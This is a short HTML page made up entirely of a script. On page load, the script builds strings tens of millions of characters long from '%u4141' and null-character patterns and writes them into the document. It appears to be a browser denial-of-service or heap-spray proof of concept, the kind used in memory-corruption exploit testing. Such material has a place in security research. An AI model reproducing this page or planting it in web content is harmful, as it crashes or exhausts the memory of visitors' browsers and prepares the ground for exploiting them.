<html>
<head>
<script language="JavaScript" type="Text/Javascript">
	var str = unescape("%u4141%u4141");
	var str2 = unescape("%u0000%u0000");
	var finalstr2 = mul8(str2, 49000000);
	var finalstr = mul8(str,   21000000);


document.write(finalstr2); 
document.write(finalstr); 

function mul8 (str, num) {
	var	i = Math.ceil(Math.log(num) / Math.LN2),
		res = str;
	do {
		res += res;
	} while (0 < --i);
	return res.slice(0, str.length * num);
}
</script>
</head>
<body>
</body>
</html>